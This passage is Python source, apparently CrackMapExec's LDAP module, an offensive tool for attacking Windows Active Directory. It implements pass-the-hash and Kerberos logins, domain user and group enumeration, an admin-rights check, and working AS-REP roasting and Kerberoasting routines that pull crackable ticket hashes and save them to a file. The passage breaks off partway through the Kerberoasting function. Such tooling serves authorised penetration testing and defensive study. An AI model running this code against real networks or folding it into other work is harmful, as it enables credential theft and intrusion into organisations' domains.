#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
import hashlib
import hmac
import os
import socket
from binascii import hexlify
from datetime import datetime
from re import sub, I
from zipfile import ZipFile
from termcolor import colored

from Cryptodome.Hash import MD4
from OpenSSL.SSL import SysCallError
from bloodhound.ad.authentication import ADAuthentication
from bloodhound.ad.domain import AD
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.samr import (
    UF_ACCOUNTDISABLE,
    UF_DONT_REQUIRE_PREAUTH,
    UF_TRUSTED_FOR_DELEGATION,
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
)
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.types import Principal, KerberosException
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.smb import SMB_DIALECT
from impacket.smbconnection import SMBConnection, SessionError

from cme.config import process_secret, host_info_colors
from cme.connection import *
from cme.helpers.bloodhound import add_user_bh
from cme.logger import CMEAdapter, cme_logger
from cme.protocols.ldap.bloodhound import BloodHound
from cme.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from cme.protocols.ldap.kerberos import KerberosAttacks

ldap_error_status = {
    "1": "STATUS_NOT_SUPPORTED",
    "533": "STATUS_ACCOUNT_DISABLED",
    "701": "STATUS_ACCOUNT_EXPIRED",
    "531": "STATUS_ACCOUNT_RESTRICTION",
    "530": "STATUS_INVALID_LOGON_HOURS",
    "532": "STATUS_PASSWORD_EXPIRED",
    "773": "STATUS_PASSWORD_MUST_CHANGE",
    "775": "USER_ACCOUNT_LOCKED",
    "50": "LDAP_INSUFFICIENT_ACCESS",
    "0": "LDAP Signing IS Enforced",
    "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
}


def resolve_collection_methods(methods):
    """
    Convert methods (string) to list of validated methods to resolve
    """
    valid_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "default",
        "all",
        "loggedon",
        "objectprops",
        "experimental",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "dconly",
        "container",
    ]
    default_methods = ["group", "localadmin", "session", "trusts"]
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "objectprops",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "container",
    ]
    # DC only, does not collect to computers
    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
    if "," in methods:
        method_list = [method.lower() for method in methods.split(",")]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                cme_logger.error("Invalid collection method specified: %s", method)
                return False

            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            cme_logger.error("Invalid collection method specified: %s", method)
            return False

class ldap(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldapConnection = None
        self.lmhash = ""
        self.nthash = ""
        self.baseDN = ""
        self.target = ""
        self.targetDomain = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        # self.logger = cme_logger
        self.logger = CMEAdapter(
            extra={
                "protocol": "LDAP",
                "host": self.host,
                "port": self.args.port,
                "hostname": self.hostname,
            }
        )

    def get_ldap_info(self, host):
        try:
            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
            ldap_url = f"{proto}://{host}"
            self.logger.info(f"Connecting to {ldap_url} with no baseDN")
            try:
                ldap_connection = ldap_impacket.LDAPConnection(ldap_url)
                if ldap_connection:
                    self.logger.debug(f"ldap_connection: {ldap_connection}")
            except SysCallError as e:
                if proto == "ldaps":
                    self.logger.debug(f"LDAPs connection to {ldap_url} failed - {e}")
                    # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority
                    self.logger.debug(f"Even if the port is open, LDAPS may not be configured")
                else:
                    self.logger.debug(f"LDAP connection to {ldap_url} failed: {e}")
                return [None, None, None]

            resp = ldap_connection.search(
                scope=ldapasn1_impacket.Scope("baseObject"),
                attributes=["defaultNamingContext", "dnsHostName"],
                sizeLimit=0,
            )
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                target = None
                target_domain = None
                base_dn = None
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "defaultNamingContext":
                            base_dn = str(attribute["vals"][0])
                            target_domain = sub(
                                ",DC=",
                                ".",
                                base_dn[base_dn.lower().find("dc=") :],
                                flags=I,
                            )[3:]
                        if str(attribute["type"]) == "dnsHostName":
                            target = str(attribute["vals"][0])
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.info(f"Skipping item, cannot process due to error {e}")
        except OSError as e:
            return [None, None, None]
        self.logger.debug(f"Target: {target}; target_domain: {target_domain}; base_dn: {base_dn}")
        return [target, target_domain, base_dn]

    def get_os_arch(self):
        try:
            string_binding = rf"ncacn_ip_tcp:{self.host}[135]"
            transport = DCERPCTransportFactory(string_binding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(
                    MSRPC_UUID_PORTMAP,
                    transfer_syntax=("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0"),
                )
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except Exception as e:
            self.logger.fail(f"Error retrieving os arch of {self.host}: {str(e)}")

        return 0

    def get_ldap_username(self):
        extended_request = ldapasn1_impacket.ExtendedRequest()
        extended_request["requestName"] = "1.3.6.1.4.1.4203.1.11.3"  # whoami

        response = self.ldapConnection.sendReceive(extended_request)
        for message in response:
            search_result = message["protocolOp"].getComponent()
            if search_result["resultCode"] == ldapasn1_impacket.ResultCode("success"):
                response_value = search_result["responseValue"]
                if response_value.hasValue():
                    value = response_value.asOctets().decode(response_value.encoding)[2:]
                    return value.split("\\")[1]
        return ""

    def enum_host_info(self):
        self.target, self.targetDomain, self.baseDN = self.get_ldap_info(self.host)
        self.hostname = self.target
        self.domain = self.targetDomain
        # smb no open, specify the domain
        if self.args.no_smb:
            self.domain = self.args.domain
        else:
            self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

            try:
                self.conn.login("", "")
            except BrokenPipeError as e:
                self.logger.fail(f"Broken Pipe Error while attempting to login: {e}")
            except Exception as e:
                if "STATUS_NOT_SUPPORTED" in str(e):
                    self.no_ntlm = True
                pass
            if not self.no_ntlm:
                self.domain = self.conn.getServerDNSDomainName()
                self.hostname = self.conn.getServerName()
            self.server_os = self.conn.getServerOS()
            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection["RequireSigning"]
            self.os_arch = self.get_os_arch()
            self.logger.extra["hostname"] = self.hostname

            if not self.domain:
                self.domain = self.hostname

            try:
                # DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                self.conn.logoff()
            except:
                pass

            if self.args.domain:
                self.domain = self.args.domain
            if self.args.local_auth:
                self.domain = self.hostname

            # Re-connect since we logged off
            self.create_conn_obj()
        self.output_filename = os.path.expanduser(f"~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

    def print_host_info(self):
        self.logger.debug("Printing host info for LDAP")
        if self.args.no_smb:
            self.logger.extra["protocol"] = "LDAP"
            self.logger.extra["port"] = "389"
            self.logger.display(f"Connecting to LDAP {self.hostname}")
            # self.logger.display(self.endpoint)
        else:
            self.logger.extra["protocol"] = "SMB" if not self.no_ntlm else "LDAP"
            self.logger.extra["port"] = "445" if not self.no_ntlm else "389"
            signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=['bold']) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=['bold'])
            smbv1 = colored(f"SMBv1:{self.smbv1}", host_info_colors[2], attrs=['bold']) if self.smbv1 else colored(f"SMBv1:{self.smbv1}", host_info_colors[3], attrs=['bold'])
            self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.domain}) ({signing}) ({smbv1})")
            self.logger.extra["protocol"] = "LDAP"
            # self.logger.display(self.endpoint)
        return True

    def kerberos_login(
        self,
        domain,
        username,
        password="",
        ntlm_hash="",
        aesKey="",
        kdcHost="",
        useCache=False,
    ):
        # cme_logger.getLogger("impacket").disabled = True
        self.username = username
        self.password = password
        self.domain = domain
        self.kdcHost = kdcHost
        self.aesKey = aesKey

        lmhash = ""
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        if not all("" == s for s in [self.nthash, password, aesKey]):
            kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
        else:
            kerb_pass = ""

        try:
            # Connect to LDAP
            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} [1]")
            self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)
            self.ldapConnection.kerberosLogin(
                username,
                password,
                domain,
                self.lmhash,
                self.nthash,
                aesKey,
                kdcHost=kdcHost,
                useCache=useCache,
            )

            if self.username == "":
                self.username = self.get_ldap_username()

            self.check_if_admin()

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            out = f"{domain}\\{self.username}{used_ccache} {self.mark_pwned()}"

            # out = f"{domain}\\{self.username}{' from ccache' if useCache else ':%s' % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8)} {highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')}"

            self.logger.extra["protocol"] = "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.success(
                f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                color="yellow",
            )
            return False
        except SessionError as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(
                f"{self.domain}\\{self.username}{used_ccache} {str(error)}",
                color="magenta" if error in ldap_error_status else "red",
            )
            return False
        except (KeyError, KerberosException, OSError) as e:
            self.logger.fail(
                f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8)} {str(e)}",
                color="red",
            )
            return False
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} [2]")
                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)
                    self.ldapConnection.kerberosLogin(
                        username,
                        password,
                        domain,
                        self.lmhash,
                        self.nthash,
                        aesKey,
                        kdcHost=kdcHost,
                        useCache=useCache,
                    )

                    if self.username == "":
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username} {self.mark_pwned()}"

                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    return True
                except SessionError as e:
                    error, desc = e.getErrorString()
                    self.logger.fail(
                        f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8)} {str(error)}",
                        color="magenta" if error in ldap_error_status else "red",
                    )
                    return False
                except:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if error_code in ldap_error_status else "red",
                    )
                    return False
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if error_code in ldap_error_status else "red",
                )
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        try:
            # Connect to LDAP
            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.debug(f"Connecting to {ldap_url} - {self.baseDN} [3]")
            self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"

            self.logger.extra["protocol"] = "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} [4]")
                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)
                    self.ldapConnection.login(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                    )
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    return True
                except:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.logger.extra["protocol"] = "LDAP"
        self.logger.extra["port"] = "389"
        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.hash == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        try:
            # Connect to LDAP
            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
            ldaps_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN}")
            self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
            self.logger.extra["protocol"] = "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                try:
                    # We need to try SSL
                    ldaps_url = f"{proto}://{self.target}"
                    self.logger.debug(f"Connecting to {ldaps_url} - {self.baseDN}")
                    self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)
                    self.ldapConnection.login(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                    )
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    return True
                except ldap_impacket.LDAPSessionError as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode') * 8} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def create_smbv1_conn(self):
        self.logger.debug(f"Creating smbv1 connection object")
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)
            self.smbv1 = True
            if self.conn:
                self.logger.debug(f"SMBv1 Connection successful")
        except socket.error as e:
            if str(e).find("Connection reset by peer") != -1:
                self.logger.debug(f"SMBv1 might be disabled on {self.host}")
            return False
        except Exception as e:
            self.logger.debug(f"Error creating SMBv1 connection to {self.host}: {e}")
            return False
        return True

    def create_smbv3_conn(self):
        self.logger.debug(f"Creating smbv3 connection object")
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445)
            self.smbv1 = False
            if self.conn:
                self.logger.debug(f"SMBv3 Connection successful")
        except socket.error:
            return False
        except Exception as e:
            self.logger.debug(f"Error creating SMBv3 connection to {self.host}: {e}")
            return False

        return True

    def create_conn_obj(self):
        if not self.args.no_smb:
            if self.create_smbv1_conn():
                return True
            elif self.create_smbv3_conn():
                return True
            return False
        else:
            return True

    def get_sid(self):
        self.logger.highlight(f"Domain SID {self.sid_domain}")

    def sid_to_str(self, sid):
        try:
            # revision
            revision = int(sid[0])
            # count of sub authorities
            sub_authorities = int(sid[1])
            # big endian
            identifier_authority = int.from_bytes(sid[2:8], byteorder="big")
            # If true then it is represented in hex
            if identifier_authority >= 2**32:
                identifier_authority = hex(identifier_authority)

            # loop over the count of small endians
            sub_authority = "-" + "-".join([str(int.from_bytes(sid[8 + (i * 4) : 12 + (i * 4)], byteorder="little")) for i in range(sub_authorities)])
            object_sid = "S-" + str(revision) + "-" + str(identifier_authority) + sub_authority
            return object_sid
        except Exception:
            pass
        return sid

    def check_if_admin(self):
        # 1. get SID of the domaine
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes = ["objectSid"]
        resp = self.search(search_filter, attributes, sizeLimit=0)
        answers = []
        if resp and self.password != "" and self.username != "":
            for attribute in resp[0][1]:
                if str(attribute["type"]) == "objectSid":
                    sid = self.sid_to_str(attribute["vals"][0])
                    self.sid_domain = "-".join(sid.split("-")[:-1])

            # 2. get all group cn name
            search_filter = "(|(objectSid=" + self.sid_domain + "-512)(objectSid=" + self.sid_domain + "-544)(objectSid=" + self.sid_domain + "-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes = ["distinguishedName"]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "distinguishedName":
                        answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + attribute["vals"][0] + ")"))

            # 3. get member of these groups
            search_filter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + "".join(answers) + "))"
            attributes = [""]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, searchFilter, attributes, sizeLimit=0):
        try:
            if self.ldapConnection:
                self.logger.debug(f"Search Filter={searchFilter}")
                
                # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
                paged_search_control = ldapasn1_impacket.SimplePagedResultsControl(criticality=True, size=1000)
                resp = self.ldapConnection.search(
                    searchFilter=searchFilter,
                    attributes=attributes,
                    sizeLimit=sizeLimit,
                    searchControls=[paged_search_control],
                )
                return resp
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                # We should never reach this code as we use paged search now
                self.logger.fail("sizeLimitExceeded exception caught, giving up and processing the data received")
                resp = e.getAnswers()
                pass
            else:
                self.logger.fail(e)
                return False
        return False

    def users(self):
        # Building the search filter
        search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"
        attributes = [
            "sAMAccountName",
            "description",
            "badPasswordTime",
            "badPwdCount",
            "pwdLastSet",
        ]

        resp = self.search(search_filter, attributes, sizeLimit=0)
        if resp:
            answers = []
            self.logger.display(f"Total of records returned {len(resp):d}")
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                badPasswordTime = ""
                badPwdCount = 0
                description = ""
                pwdLastSet = ""
                try:
                    if self.username == "":
                        self.logger.highlight(f"{item['objectName']}")
                    else:
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                            elif str(attribute["type"]) == "description":
                                description = str(attribute["vals"][0])
                        self.logger.highlight(f"{sAMAccountName:<30} {description}")
                except Exception as e:
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
                    pass
            return

    def groups(self):
        # Building the search filter
        search_filter = "(objectCategory=group)"
        attributes = ["name"]
        resp = self.search(search_filter, attributes, 0)
        if resp:
            answers = []
            self.logger.debug(f"Total of records returned {len(resp):d}")

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                name = ""
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "name":
                            name = str(attribute["vals"][0])
                    self.logger.highlight(f"{name}")
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
                    pass
            return
    
    def dc_list(self):
        
        # Building the search filter
        search_filter = "(&(objectCategory=computer)(primaryGroupId=516))"
        attributes = ["dNSHostName"]
        resp = self.search(search_filter, attributes, 0)
        for item in resp:              
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            name = ""
            try:           	    
            	for attribute in item["attributes"]:     
            	    if str(attribute["type"]) == "dNSHostName":
            	        name = str(attribute["vals"][0])
            	try:
            	    ip_address = socket.gethostbyname(name.split(".")[0])
            	    if ip_address != True and name != "":
            	        self.logger.highlight(f"{name} =", ip_address) 	    
            	except socket.gaierror:
            	    self.logger.fail(f"{name} = Connection timeout")
            except Exception as e:
                self.logger.fail("Exception:", exc_info=True)
                self.logger.fail(f"Skipping item, cannot process due to error {e}")

    def asreproast(self):
        if self.password == "" and self.nthash == "" and self.kerberos is False:
            return False
        # Building the search filter
        search_filter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)
        if resp == []:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []
            self.logger.display(f"Total of records returned {len(resp):d}")

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "sAMAccountName":
                            sAMAccountName = str(attribute["vals"][0])
                            mustCommit = True
                        elif str(attribute["type"]) == "userAccountControl":
                            userAccountControl = "0x%x" % int(attribute["vals"][0])
                        elif str(attribute["type"]) == "memberOf":
                            memberOf = str(attribute["vals"][0])
                        elif str(attribute["type"]) == "pwdLastSet":
                            if str(attribute["vals"][0]) == "0":
                                pwdLastSet = "<never>"
                            else:
                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "lastLogon":
                            if str(attribute["vals"][0]) == "0":
                                lastLogon = "<never>"
                            else:
                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    if mustCommit is True:
                        answers.append(
                            [
                                sAMAccountName,
                                memberOf,
                                pwdLastSet,
                                lastLogon,
                                userAccountControl,
                            ]
                        )
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
                    pass
            if len(answers) > 0:
                for user in answers:
                    hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
                    self.logger.highlight(f"{hash_TGT}")
                    with open(self.args.asreproast, "a+") as hash_asreproast:
                        hash_asreproast.write(hash_TGT + "\n")
                return True
            else:
                self.logger.highlight("No entries found!")
                return
        else:
            self.logger.fail("Error with the LDAP account used")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
        attributes = [
            "servicePrincipalName",
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        if not resp:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                SPNs = []
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                delegation = ""
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "sAMAccountName":
                            sAMAccountName = str(attribute["vals"][0])
                            mustCommit = True
                        elif str(attribute["type"]) == "userAccountControl":
                            userAccountControl = str(attribute["vals"][0])
                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
